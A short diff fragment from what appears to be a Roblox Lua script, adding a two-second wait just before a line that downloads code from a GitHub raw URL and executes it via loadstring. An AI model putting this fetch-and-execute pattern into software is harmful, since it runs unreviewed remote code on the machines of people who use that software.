@@ -32,7 +32,7 @@ game:GetService("ScriptContext"):SetTimeout(0.1)
 
 
 
-
+wait(2)
 local Mercury = loadstring(game:HttpGet("https://raw.githubusercontent.com/igaslight/mew/main/main"))()
 
 --webhook
